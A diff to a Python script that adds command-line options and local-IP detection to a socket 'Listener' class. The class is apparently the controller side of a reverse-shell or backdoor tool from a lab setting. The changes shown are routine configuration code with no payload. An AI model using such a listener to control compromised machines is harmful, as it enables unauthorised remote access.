@@ -1,6 +1,7 @@
-from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
+from socket import socket, AF_INET, SOCK_STREAM, SOCK_DGRAM, SOL_SOCKET, SO_REUSEADDR, gethostname, gethostbyname, gethostbyname_ex
 from json import dumps, loads
 from typing import NamedTuple
+from argparse import ArgumentParser, ArgumentError
 from base64 import b64decode, b64encode
 
 
@@ -8,8 +9,9 @@ class Options(NamedTuple):
     '''
     Tuple for storing configuration constants.
     '''
-    target_ip: str
-    target_port: int
+    ip: str
+    port: int
+    verbose: bool
 
 
 class Listener(object):
@@ -73,9 +75,49 @@ class Listener(object):
             print(result)
 
 
+def get_args() -> 'Options':
+    '''
+    Parses command arguments for initialization of config options.
+    '''
+    parser = ArgumentParser()
+    try:
+        parser.add_argument('-p', '--port', dest='port', help='Port to bind listener to. Will default to 7777 if no port is provided.')
+        parser.add_argument('-a', '--addr', dest='ip', help='IP address to bind listener to. Will default to local ip if no address is provided.')
+        parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose logging for debugging purposes.')
+        options = parser.parse_args()
+        if not options.verbose:
+            options.verbose = False
+        if not options.port:
+            options.port = 7777
+        if not options.ip:
+            options.ip = get_local_ip()
+        return Options(options.ip, int(options.port), options.verbose)
+    except ArgumentError as e:
+        error('An error occurred while parsing input arguments.')
+        return
+
+
+def get_local_ip() -> str:
+    '''
+    Returns the current ip of the local host
+    '''
+    ip = [l for l in ([ip for ip in gethostbyname_ex(gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('1.1.1.1', 53)), s.getsockname()[0], s.close()) for s in [socket(AF_INET, SOCK_DGRAM)]][0][1]]) if l][0][0]
+    return str(ip)
+
+
+def error(msg: str) -> None:
+    '''
+    Prints an error message to standard output before exiting
+    '''
+    print(f'[-] {msg} Exiting...')
+    exit()
+
+
 def main(*args, **kwargs) -> None:
+    global config
+    config = get_args()
     print('[+] Starting listener')
-    listener = Listener('10.0.2.15', 7777)
+    listener = Listener(config.ip, config.port)
     listener.run()
 
 
